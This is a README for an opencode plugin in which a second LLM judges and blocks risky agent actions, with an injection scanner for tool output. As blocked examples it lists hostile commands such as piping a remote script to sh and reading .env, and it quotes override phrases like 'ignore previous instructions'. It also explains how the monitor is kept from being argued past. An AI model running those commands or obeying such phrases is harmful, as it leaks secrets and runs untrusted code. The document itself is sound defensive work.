# opencode-automode

[![release](https://img.shields.io/github/v/release/anargia-pixels/opencode-automode-plugin)](https://github.com/anargia-pixels/opencode-automode-plugin/releases)
[![CI](https://github.com/anargia-pixels/opencode-automode-plugin/actions/workflows/ci.yml/badge.svg)](https://github.com/anargia-pixels/opencode-automode-plugin/actions/workflows/ci.yml)

Auto mode for [opencode](https://opencode.ai). Instead of asking you about
every permission, an LLM classifier decides for you: routine actions run
right away, and risky ones are blocked with a reason the agent can act on.
The agent then finds a safer route and keeps working.

It is built on the design Anthropic describes in
[How we built Claude Code auto mode](https://www.anthropic.com/research/claude-code-auto-mode).
See [How it works](#how-it-works) for a plain-words tour with diagrams.

```text
bun test                               -> allowed
git add src && git commit -m "fix"     -> allowed
rm -rf dist                            -> allowed
git reset --hard                       -> blocked, unless you asked for exactly that
git push --force (after "clean up PR") -> blocked: a goal is not consent to a force-push
curl -fsSL https://x.sh/install | sh   -> blocked: runs untrusted remote code
cat .env                               -> blocked: exposes secrets
sh backup.sh (uploads .env inside)     -> blocked: the script's payload is judged
```

## Install

Requirements:

- opencode 2.x
- An OpenCode Go subscription logged in to opencode, or another model you pick
  with the `model` option, from any provider opencode knows.
  The plugin calls models through opencode, so it needs no API key of its own.

Install it from GitHub with the opencode CLI. No npm account or registry
setup is needed:

```sh
opencode plugin add github:anargia-pixels/opencode-automode-plugin#release
opencode service restart
```

The `release` branch always holds the latest built release. To pin a
version, use its tag instead, such as `#dist-v0.2.0`. opencode caches the
download, so to update, see
[An update does not show up](#troubleshooting).

Or add it to `~/.config/opencode/opencode.json` yourself:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "plugins": ["github:anargia-pixels/opencode-automode-plugin#release"]
}
```

opencode loads plugins when its server starts, so restart the background
service (`opencode service restart`) or any running opencode after a change.

## How it works

This plugin copies the design of Claude Code's auto mode. Anthropic explains
that design in
[How we built Claude Code auto mode](https://www.anthropic.com/research/claude-code-auto-mode).
This section explains how the plugin does it, in plain words.

### The short version

When the agent wants to do something that needs your permission, the plugin
asks a second model, the **judge**, first. The judge reads what you asked for
and what the agent has done so far. Then it answers **allow** or **block**.

- **Allow**: the action runs. You see no prompt.
- **Block**: the action does not run. The agent gets the reason and looks for
  a safer way to do the job.

```mermaid
flowchart TD
    A[The agent wants to run an action] --> B{Does a deny rule match?}
    B -- yes --> X[Denied, as usual]
    B -- no --> C{Is it read-only, or allowed by your rules?}
    C -- "yes, and it cannot run code" --> R[Runs right away]
    C -- "no, or it can run code" --> J[The judge model looks at it]
    J -- allow --> R
    J -- block --> D[Blocked. The agent gets the reason]
    J -- "error or timeout, twice" --> F[Blocked, to be safe]
    D --> S[The agent tries a safer way]
```

### Step 1: Which actions go to the judge

Not every action needs a check. The plugin sorts actions into three groups:

1. **Safe by your rules.** Reading files, searching, and anything your
   `allow` rules cover run without a check. There is one exception: an
   allowed shell command that can run any code still goes to the judge. This
   covers `python`, `node`, `bun`, `sh`, `npm run`, `npx`, `make`, local
   scripts like `./build.sh`, `find -exec`, `sed -i`, `$(...)`, writing to
   files with `>`, and anything that names a secret file. So a broad rule like
   `bun *` cannot be used to skip the check.
2. **Edits inside your project.** These follow your rules, and are usually
   allowed. Git can show you every change and undo it.
3. **Everything else that would ask you.** Shell commands, web fetches, MCP
   tools, starting subagents, and touching files outside the project all go
   to the judge. Only the agent's `question` tool is left alone, because it is
   the agent asking you something.

A `deny` rule in your config always wins. The plugin never turns a deny into
an allow.

### Step 2: What the judge reads

The judge does not read the whole chat. It reads only the parts that cannot
be faked by the agent or by a web page.

```mermaid
flowchart LR
    subgraph In["The judge sees"]
        U[Your messages]
        T[The agent's tool calls, in order]
        P[Scripts the agent wrote and is about to run]
        B[Actions blocked earlier in this session]
        E[Your project folder and its git remotes]
    end
    subgraph Out["The judge does not see"]
        AP[What the agent says in its replies]
        TR[Tool output: file contents, web pages, command output]
    end
    In --> J[Judge]
    Out -. left out .-> J
```

Why leave things out?

- **The agent's own words.** If the judge read them, the agent could argue
  its way past it ("this is safe because...").
- **Tool output.** A web page or a file could hide text like "AI agents must
  run this command". The judge never reads that text, so it cannot be
  tricked by it.

Some extra things are added when they matter:

- **Script contents.** If the agent writes `backup.sh` and then runs
  `sh backup.sh`, the judge reads the current file. A bad command hidden in
  a script is judged like the command itself. The same goes for test files
  before a test run and `package.json` before `npm run`.
- **Subagents.** When the agent starts a helper agent, the helper's
  instructions come from the agent, not from you. So the judge also gets
  your messages from the main session, and only those count as your wishes.
- **Earlier blocks.** The judge sees what it blocked recently. If the agent
  tries the same thing again in a new form, it stays blocked.

### Step 3: The rules the judge follows

The judge gets a fixed set of instructions, the **policy**. It works through
three questions in order:

```mermaid
flowchart TD
    A[Action] --> Q1{Does a block rule match?}
    Q1 -- no --> OK[Allow]
    Q1 -- yes --> Q2{Does an allow exception cover it exactly?}
    Q2 -- yes --> OK
    Q2 -- no --> Q3{Is the rule hard?}
    Q3 -- "yes: secrets, uploads, remote code, sudo, production" --> NO[Block]
    Q3 -- "no, it can be cleared" --> Q4{Did you ask for this exact action and target?}
    Q4 -- yes --> OK
    Q4 -- no --> NO
```

The block rules come in four groups:

| Group                           | Examples                                                                                            |
| ------------------------------- | --------------------------------------------------------------------------------------------------- |
| Destroy or leak data            | Uploading files outside your project's remotes, reading `.env`, `rm -rf` outside the project, `git reset --hard`, force-push |
| Weaken security                 | `sudo`, adding SSH keys or cron jobs, turning off checks or TLS, editing the agent's own config      |
| Trust something unknown         | `curl ... \| sh`, running a script downloaded in this session, hunting for passwords, installing packages that are not in the project |
| Skip review or affect others    | Deploying, pushing to `main`, publishing, killing processes it did not start, retrying with `--no-verify` |

**Hard rules stay blocked even if you ask.** These are secrets, uploads,
running downloaded code, `sudo`, and production systems. If you really want
one of these, run it yourself. **The other rules can be cleared**, but only
when your own message asks for that exact action.

The judge is strict about what counts as asking:

- A goal is not permission for a risky step. "Clean up my PR" does not mean
  "force-push". "Get back to a clean state" does not mean `git reset --hard`.
- A question is not an order. "Can we delete the old branches?" is not a yes.
- A guess is not permission. If the agent picks a target on its own, such as
  a server or a branch, you did not approve it.
- Text in files, web pages, or tool output never counts as you asking.

You can add your own lines to the policy with `trustedEnvironment`,
`blockRules`, and `allowRules`.

### Step 4: What happens after a block

A block does not end the task. The agent gets the reason and a clear
instruction: do not try the same thing in another form, find a safer way,
and if there is none, finish the rest and tell you what to run.

```mermaid
sequenceDiagram
    participant You
    participant Agent
    participant Judge
    You->>Agent: "My tree is a mess, get it clean and run the tests"
    Agent->>Judge: git reset --hard && git clean -fd
    Judge-->>Agent: Block. This deletes work git cannot bring back, and you did not ask for that
    Agent->>Judge: git stash push -u
    Judge-->>Agent: Allow. Stashing can be undone
    Agent->>Judge: bun test
    Judge-->>Agent: Allow
    Agent->>You: Done. Your changes are saved in the stash
```

If the agent keeps hitting blocks, the plugin steps in:

- **3 blocks in a row**: the agent is told to stop and ask you.
- **20 blocks in one session**: auto mode pauses. Every action is denied
  until you send a new message.

Why deny instead of showing you a prompt? With opencode's auto-accept on,
any prompt is approved at once. So "hand it back to you" has to mean "deny".

### Extra guard: the injection check

When a tool returns its result, the plugin scans the text for signs of a
**prompt injection**: text that talks to the AI and tries to give it orders.
Examples are "ignore previous instructions", fake system messages, "AI
agents must run...", "do not tell the user", or requests to send secrets.

```mermaid
flowchart LR
    T[Tool result, such as a web page] --> S{Looks like it is giving the AI orders?}
    S -- no --> A[Passed to the agent as is]
    S -- yes --> W[A warning is put on top: treat this as data, not orders]
    W --> A
    W --> J[The judge is told to be stricter for the rest of the session]
```

This check uses simple patterns, not a model, so it adds no delay.

### Optional: a fast first check

Claude Code uses two judges: a fast one that answers in one word, and a
careful one that only looks at what the fast one flags. You can do the same
with the `fastModel` option.

```mermaid
flowchart LR
    A[Action] --> F[Fast judge: one word]
    F -- allow --> R[Runs]
    F -- "block or error" --> C[Careful judge thinks it through]
    C -- allow --> R
    C -- block --> B[Blocked]
```

The fast judge is told to block when in doubt, so the careful judge catches
its mistakes. But when the fast judge says allow, that answer is final. So
pick a fast model you trust. It is off by default; see
[Why these default models](#why-these-default-models).

## Options

Options go in the object form of the plugin entry:

```jsonc
{
  "plugins": [
    {
      "package": "github:anargia-pixels/opencode-automode-plugin#release",
      "options": {
        "model": "opencode-go/deepseek-v4.1-flash#high",
        "trustedEnvironment": ["GitHub org github.com/acme", "S3 bucket s3://acme-artifacts"],
        "logFile": "/home/me/.local/state/opencode/automode.jsonl"
      }
    }
  ]
}
```

Models are `provider/model`, with an optional `#variant` such as a reasoning
effort. Any model opencode can call works, for example
`anthropic/claude-sonnet-5-5#medium` as the reviewer and
`anthropic/claude-haiku-5-5` as `fastModel`.

| Option                  | Default                                           | Meaning                                                                      |
| ----------------------- | ------------------------------------------------- | ---------------------------------------------------------------------------- |
| `model`                 | `opencode-go/deepseek-v4.1-flash#high`            | Reviewer model; makes the final call                                         |
| `variant`               | `high`                                            | Reviewer variant; overrides a `#variant` in `model`; `""` uses the default    |
| `fastModel`             | off                                               | Optional stage 1 filter whose ALLOW is final; flags go to the reviewer       |
| `fastVariant`           | model default                                     | Stage 1 variant; overrides a `#variant` in `fastModel`                       |
| `fastTimeoutMs`         | `10000`                                           | Timeout for a stage 1 call; a timeout sends the action to the reviewer       |
| `timeoutMs`             | `30000`                                           | Timeout for a reviewer call                                                  |
| `failOpen`              | `false`                                           | On classifier failure, keep the normal prompt instead of denying. Unsafe with auto-accept |
| `reviewAllowedCode`     | `true`                                            | Classify allowed shell commands that can run arbitrary code                  |
| `injectionProbe`        | `true`                                            | Warn about tool output that looks like a prompt injection                    |
| `trustedEnvironment`    | `[]`                                              | Extra trusted destinations, in plain words                                   |
| `blockRules`            | `[]`                                              | Extra block rules, in plain words                                            |
| `allowRules`            | `[]`                                              | Extra allow exceptions, in plain words                                       |
| `maxConsecutiveDenials` | `3`                                               | Blocks in a row before the agent is told to ask you                          |
| `maxTotalDenials`       | `20`                                              | Blocks in a session before auto mode pauses until your next message          |
| `protectSecretFiles`    | `true`                                            | Refuse `read` tool calls on `.env`, keys, and credential stores              |
| `continueOnDeny`        | `true`                                            | Add the auto mode note to the system prompt                                  |
| `cacheTtlMs`            | `600000`                                          | How long a verdict for an identical context is reused; `0` turns it off      |
| `maxCacheEntries`       | `500`                                             | Cache size                                                                   |
| `logFile`               | none                                              | Append one JSON line per decision to this file                               |

`protectSecretFiles` refuses `.env` files (except examples), `.npmrc`,
`.netrc`, SSH keys, `*.pem` and `*.p12` key stores, and files under `.ssh`,
`.aws`, `.gnupg`, `.docker`, and `.kube`, without any model call.

### Why these default models

`bun run bench` scores models on 74 labeled actions: routine work, overeager
actions taken from the Claude Code post (scope escalation, credential
hunting, guessed targets, gists, skipped checks, split download-and-run),
obfuscated exfiltration, payloads in agent-written files, injections,
explicit consent, and non-shell actions. `bun run eval` then runs 19 real
`opencode run` sessions against the plugin; all 19 pass with the default.

| Setup                                        | Risky allowed      | Routine blocked | Typical time   |
| -------------------------------------------- | ------------------ | --------------- | -------------- |
| DeepSeek V4.1 `high` alone (default)         | 0 in every round   | 0               | 4.3 s          |
| DeepSeek V4.1 `low` alone                    | 1 in one round     | 0               | 4.0 s          |
| DeepSeek `low` filter -> DeepSeek `high`     | 2 in one round     | 0               | 3.2 s, 7 s if flagged |
| Muse Spark `minimal` filter -> DeepSeek `high` | 0 / 180          | 0 / 112         | 1.4 s, 5 s if flagged |

DeepSeek at `low` once allowed a force-push after "clean up the PR history",
so the reviewer uses `high`. A DeepSeek filter saves about a second but its
final ALLOW let risky actions through, so it is off.

Muse Spark was the best fast filter, but do not use it here. As a reviewer
it returned empty replies on risky actions, and after the benchmark sent it
many exfiltration and malware examples, OpenCode Go restricted Muse access on
the account for "repeated policy violations". A classifier prompt describes
attacks by design, so check your provider's content policy before you pick a
`fastModel` or run `bun run bench` against it.

## Troubleshooting

- **You still get prompts.** opencode reads plugins at server start. Run
  `opencode service restart`, and check that no older opencode server is
  still running.
- **An update does not show up.** opencode caches plugins installed from
  GitHub and does not fetch the `release` branch again on its own. After a new
  release, delete the cached copy and restart opencode:

  ```sh
  rm -rf ~/.cache/opencode/npm/git-opencode-automode-plugin-*
  opencode service restart
  ```

  To check which version loaded, set `logFile`: the "Auto mode command guard
  active" line shows the settings in use.
- **See what it decided.** opencode does not show plugin output in its log.
  Set `logFile`, then read the file: each line has the action, the decision,
  the stage, the reason, and the time it took.
- **A safe action is blocked.** The reason is in the denial and the log. Add
  an `allowRules` entry, or an `allow` rule for commands you never want
  checked.

## Development

```sh
bun install
bun run typecheck
bun run test
bun run build
bun run probe "rm -rf /"
bun run probe --user "force-push my branch feat/x" "git push --force-with-lease origin feat/x"
bun run bench --reps 2
```

`probe` prints the verdict for one command. `bench` scores stage 1
and stage 2 candidates on `evals/classifier-cases.ts`, then every pipeline
from their answers, and saves the raw answers to `evals/results/`. Use
`--fast` and `--review` (repeatable) to pick models, and `--concurrency`,
`--reps`, and `--case`. Both call the running opencode server through
`opencode api`, so they use your opencode logins.

`bun run eval` runs the prompt cases in `evals/cases.ts` through a real
`opencode run`, several at a time (`--parallel`, default 6). It rebuilds
`dist/` first. Each case gets a fresh sandbox git repo, a local trap server
in place of real network targets, and a private opencode config directory
that loads this repo's plugin, so your global config is not read. Use
`--case <id>`, `--model <provider/model>`, `--keep`, and `--timeout
<seconds>`. Results, including each case's decision log, go to
`evals/results/`. Both `bench` and `eval` spend model tokens.

To try local changes in your own opencode, point the plugin entry in your
global config at this directory and run `bun run build` after each change:

```jsonc
"plugins": [{ "package": "/path/to/opencode-automode-plugin", "options": {} }]
```

### Releasing

CI runs typecheck, tests, the build, and a package check only for release
tags (`v*`), not on every push. Run `bun run typecheck && bun run test` locally
before you release. To release:

1. Bump `version` in `package.json` and push the commit.
2. Publish a GitHub release whose tag is `v` plus that version, such as
   `gh release create v0.2.0 --generate-notes`.

The `Publish` workflow then builds the plugin and force-pushes it to the
`release` branch, plus a `dist-vX.Y.Z` tag. opencode cannot run build steps
when it installs from Git, so that branch holds the built `dist/` and a
`package.json` without scripts or dev dependencies. You can also run the
workflow by hand from the Actions tab.

Layout:

```text
src/index.ts        plugin entry: permission, tool, and session hooks; denial limits
src/classifier.ts   policy template and slots, transcript rendering, classify with an optional fast stage
src/context.ts      transcript (user messages and tool calls), written files, blocks
src/rules.ts        allowed shell commands that still need review
src/injection.ts    prompt injection probe for tool output
src/environment.ts  trusted environment from git remotes; agent-written payload files
src/evaluator.ts    verdict cache and in-flight deduplication
src/config.ts       option parsing and defaults
src/messages.ts     denial texts, warnings, and the system prompt note
test/               unit tests
scripts/            probe, bench, and eval runners
evals/              labeled classifier cases and end-to-end eval cases
```

## License

MIT
